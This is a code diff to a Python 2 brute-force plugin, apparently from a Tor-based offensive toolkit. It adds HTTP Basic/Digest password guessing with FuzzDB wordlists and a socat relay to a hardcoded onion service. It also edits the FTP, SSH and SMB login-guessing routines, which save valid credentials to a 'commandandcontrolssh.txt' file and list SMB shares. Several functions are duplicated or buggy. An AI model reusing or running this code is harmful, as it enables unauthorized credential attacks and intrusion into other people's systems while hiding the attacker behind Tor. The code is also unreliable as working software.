@@ -56,6 +56,13 @@ class bruterPlugin(BasePlugin):
         if len(self.torNodes) > 0:
             self.info("[*] bruterPlugin Destroyed!")
 
+    #WRITE THIS FUNCION IN BASEPLUGIN!!!
+    def testingSocat(self):
+        from subprocess import Popen, PIPE, STDOUT
+        cmd = os.getcwd()+'/plugins/utils/socat/socat TCP4-LISTEN:139,reuseaddr,fork SOCKS4A:127.0.0.1:nwoh63bjv77u7llm.onion:139,socksport=9150'
+        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)
+        print p.pid
+
     def setDictSeparator(self, separator):
         print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
         self.separator = separator
@@ -282,13 +289,61 @@ class bruterPlugin(BasePlugin):
                 return
             
 
-    def smbBruterOnAllRelays(self, dictFile=None):
-        if dictFile is None:
-            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
+    def smbBruterOnAllRelays(self, relay, port=139, dictFile=None):
+        for relay in self.bruteForceData:
+            self.smbBruterOnRelay(relay, port=port, dictFile=dictFile)
+
 
     def smbBruterOnHiddenService(self, onionService, dictFile=None):
         if dictFile is None:
             print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
+
+
+    ################################################################################################################################################
+    ###########################FUNCTIONS TO PERFORM HTTP BRUTEFORCE ATTACKS.########################################################################
+    ################################################################################################################################################
+    def httpBruterOnRelay(self, host, port=80, dictFile=None):
+        self.unsetSocksProxy()
+        print "[+] Starting HTTP BruteForce mode against %s on port %s" %(host, str(port))
+        if dictFile is not None and os.path.exists(dictFile):
+            print "[+] Reading the Passwords file %s " %(dictFile)
+            for line in open(dictFile, "r").readlines():
+                [user, passwd] = line.strip().split(self.separator)
+                try :
+                    if self.performHTTPAuthConnection(host,port, user=user, passwd=passwd):
+                        break
+                except Exception as excep:
+                    print "[-] Captured exception. Finishing attack."
+                    print sys.exc_info()
+                    return
+        else:
+            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
+            usersList = self.getUserlistFromFuzzDB()
+            passList = self.getPasslistFromFuzzDB()
+
+            try :
+                for user in usersList:
+                    #Same user and password are valid?
+                    if self.performHTTPAuthConnection(host,port, user=user, passwd=user):
+                        break
+                    for passwd in passList:
+                        if self.performHTTPAuthConnection(host,port, user=user, passwd=passwd):
+                            return
+            except Exception as excep:
+                print "[-] Captured exception. Finishing attack."
+                print sys.exc_info()
+                return
+
+
+    def smbBruterOnAllRelays(self, relay, port=139, dictFile=None):
+        for relay in self.bruteForceData:
+            self.smbBruterOnRelay(relay, port=port, dictFile=dictFile)
+
+
+    def smbBruterOnHiddenService(self, onionService, dictFile=None):
+        if dictFile is None:
+            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
+
 
     ################################################################################################################################################
     ###########################   COMMON FUNCTIONS.   ##############################################################################################
@@ -318,7 +373,7 @@ class bruterPlugin(BasePlugin):
             success = sessionFtp.login(user, passwd)
             if success:
                 ftpFile = open(ftpFileName, 'a')
-                print "[+] FTP Bruteforce Success ... username: %s and passoword %s are VALID! " % (user, passwd)
+                print "[+] FTP Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
                 sessionFtp.quit()
                 sessionFtp.close()
                 entry = '%s:%s:%s' %(host, user, passwd)
@@ -358,7 +413,7 @@ class bruterPlugin(BasePlugin):
             print sys.exc_info()
             raise exc
         if client:
-            print "[+] SSH Bruteforce Success ... username: %s and password %s are VALID! " % (user, passwd)
+            print "[+] SSH Connection Success ... username: %s and password %s are VALID! " % (user, passwd)
             client.close()
             sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
             if os.path.exists(sshFileName) == False:
@@ -393,7 +448,7 @@ class bruterPlugin(BasePlugin):
         self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=self.cli.logger.ERROR)
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        proxyCommand = os.getcwd()+'/plugins/bruteforce/utils/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
+        proxyCommand = os.getcwd()+'/plugins/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
         proxy = paramiko.ProxyCommand(proxyCommand)
         try:
             # IF Hidden Service is incorrect: SSHException: Error reading SSH protocol banner
@@ -415,7 +470,7 @@ class bruterPlugin(BasePlugin):
             raise exc
 
         if client:
-            print "[+] SSH Bruteforce Success ... username: %s and password %s are VALID! " % (user, passwd)
+            print "[+] SSH Connection Success ... username: %s and password %s are VALID! " % (user, passwd)
             sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
             if os.path.exists(sshFileName) == False:
                 sshFile = open(sshFileName, 'w')
@@ -441,12 +496,11 @@ class bruterPlugin(BasePlugin):
             return True
 
     def performSMBConnection(self, host, port, user, passwd):
-        self.setSocksProxy()
         import socket
         client_name =socket.gethostname()
         smbClient = SMBConnection(user, passwd, client_name, "", use_ntlm_v2 = True)
         if smbClient.connect(host, port):
-            print "[+] SMB Bruteforce Success ... username: %s and passoword %s are VALID! " % (user, passwd)
+            print "[+] SMB Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
             print "[+] Listing the Shared resources"
             for share in smbClient.listShares():
                 print "[*][*] Resource name: %s " %(share.name)
@@ -455,6 +509,25 @@ class bruterPlugin(BasePlugin):
             return False
 
 
+    def performHTTPAuthConnection(self, url, port, user, passwd):
+        import requests
+        initialResponse = requests.get(url)
+        if initialResponse.status_code == 401:
+            if initialResponse.has_key('www-authenticate') and 'Digest' in initialResponse['www-authenticate']:
+                #Digest Auth.
+                print "[+] Header 'www-authenticate' in response. Digest Authentication requested by the server."
+                from requests.auth import HTTPDigestAuth
+                res = requests.get(url, auth=HTTPDigestAuth(user, passwd))
+            elif initialResponse.has_key('www-authenticate') and 'Basic' in initialResponse['www-authenticate']:
+                #Basic Auth.
+                print "[+] Header 'www-authenticate' in response. Basic Authentication requested by the server."
+                from requests.auth import HTTPBasicAuth
+                res = requests.get(url, auth=HTTPBasicAuth(user, passwd))
+            if res and res.status_code == 200:
+                print "[+] HTTP Auth Connection Success ... username: %s and passoword %s are VALID! " % (user, passwd)
+                return True
+            else:
+                return False
 
     def getUserlistFromFuzzDB(self):
         '''
